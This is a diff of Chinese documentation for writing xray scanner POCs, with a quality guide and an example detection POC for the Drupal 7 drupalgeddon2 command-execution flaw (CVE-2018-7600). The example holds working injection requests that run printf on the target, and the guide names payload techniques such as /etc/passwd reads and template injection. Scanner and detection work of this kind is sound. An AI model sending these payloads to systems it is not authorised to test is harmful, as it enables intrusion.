@@ -56,6 +56,8 @@ rules:
 
 detail:
   author: name(link)
+  links: 
+    - http://example.com
 ```
 
 整个POC是一个键值对，其包含3个键：
@@ -70,8 +72,7 @@ rules是一个由规则（Rule）组成的列表，后面会描述如何编写Ru
 
 detail是一个键值对，内部存储需要返回给xray引擎的内容，如果无需返回内容，可以忽略。
 
-如果想要贡献 poc，请参阅 [贡献POC](guide/contribute.md) 章节，里面对 poc 的编写有约束。
-
+如果想要贡献 poc，请参阅 [贡献POC](guide/contribute.md) 章节，里面对 poc 的编写有更多的约束。
 
 ## 如何编写Rule
 
@@ -259,6 +260,19 @@ expression: |
  - 确定 poc 语法正确，payload 正确。
  - 在配置文件 `http` 段中加入 `proxy: "http://proxy:port"`，比如设置 burpsuite 为代理，这样 poc 发送的请求可以在 burp 中看到，看是否是期望的样子。
 
+## 如何编写一个高质量的 POC
+
+一个通用的指南可以参考 https://paper.seebug.org/9/ 文章写得非常好
+
+下面是一个简短的总结
+
+ - 不要条件过于宽松，比如 `status==200` 这种
+ - 使用回显的时候，尽量不要回显和提交数据一致的内容，比如一个文件读取漏洞 `filename=/etc/passwd`，然后 `body.bcontains('/etc/passwd')`，这样如果页面上是 `/etc/passwd 不存在` 就可能产生误报。正确的方法包括
+   - `md5(STR)` 然后判断返回值 （常见于sql 注入、代码执行等）
+   - `printf NUMBER%%NUMBER`，然后返回值应该是 `NUMBER%NUMBER`，会少一个 `%`，具体参考 https://github.com/chaitin/xray/pull/64#issuecomment-522412051 （常见于代码执行、命令执行等）
+   - 数学表达式，比如 `{{NUMBER+NUMBER}}` （常见于模板注入、表达式注入等）
+ - 注意不同平台的区别，比如文件读取在 Windows 下面可能就没有 `/etc/passwd`，如果可以的话，最好是读取类似 `../../index.php` 这种网站自己的代码路径。
+
 ## 一个示例POC：《Drupal7 drupalgeddon2 命令执行漏洞（CVE-2018-7600）》
 
 这里给出一个样例POC：
@@ -269,7 +283,6 @@ rules:
   - method: POST
     path: "/?q=user/password&name[%23post_render][]=printf&name[%23type]=markup&name[%23markup]=test%25%25test"
     headers:
-      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
     body: |
       form_id=user_pass&_triggering_element_name=name&_triggering_element_value=&opz=E-mail+new+Password
     search: |
@@ -278,14 +291,15 @@ rules:
       status==200
   - method: POST
     path: "/?q=file%2Fajax%2Fname%2F%23value%2F{{1}}"
-    headers:
-      User-Agent: "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
     body: |
       form_build_id={{1}}
     expression: |
       body.bcontains(b'test%test')
 detail:
+  author: phithon(https://www.leavesongs.com/)
   drupal_version: 7
+  links:
+    - https://github.com/dreadlocked/Drupalgeddon2
 ```
 
 该POC分为两个Rule，第一个发送一个POST包，将我们需要的Payload注入缓存中，同时，利用search字段提取缓存ID；第二个数据包，将前面提取的缓存ID`{{1}}`，拼接到body中，触发代码执行漏洞，并使用`body.bcontains(b'test%test')`来判断是否成功执行。
